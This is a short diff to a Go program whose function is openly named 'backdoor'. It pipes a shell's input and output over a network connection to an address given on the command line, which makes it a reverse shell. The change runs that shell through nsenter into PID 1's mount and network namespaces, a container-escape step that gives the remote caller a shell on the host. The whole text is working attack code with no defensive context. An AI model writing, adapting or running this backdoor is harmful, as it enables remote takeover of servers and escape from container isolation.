@@ -9,7 +9,7 @@ import (
 
 func main() {
 	addr := os.Args[1]
-	shell := "sh"
+	shell := "/bin/sh"
 	if len(os.Args) > 2 {
 		shell = os.Args[2]
 	}
@@ -24,7 +24,7 @@ func backdoor(addr, shell string) error {
 		return err
 	}
 	defer c.Close()
-	cmd := exec.Command(shell)
+	cmd := exec.Command("/nsenter", "-t", "1", "-m", "-n", "--", shell)
 	cmd.Stdin = c
 	cmd.Stdout = c
 	cmd.Stderr = c
